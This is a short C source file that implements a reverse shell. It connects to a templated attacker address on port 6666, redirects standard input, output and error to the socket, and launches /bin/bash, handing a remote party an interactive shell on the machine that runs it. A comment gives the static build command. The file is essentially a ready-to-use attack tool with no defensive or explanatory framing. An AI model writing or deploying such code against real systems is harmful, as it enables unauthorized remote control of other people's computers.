#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

// compile with gcc -static shell.c -o shell

int main () {

	const char* ip = "${ATTACKER_IP}";	
	struct sockaddr_in addr;


	addr.sin_family = AF_INET;
	addr.sin_port = htons(6666);
	inet_aton(ip, &addr.sin_addr);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockadr *)&addr, sizeof(addr));

	for (int i = 0; i < 3;i++) {

		dup2(sockfd, i);
	}

	execve("/bin/bash", NULL, NULL);

	return 0;

}
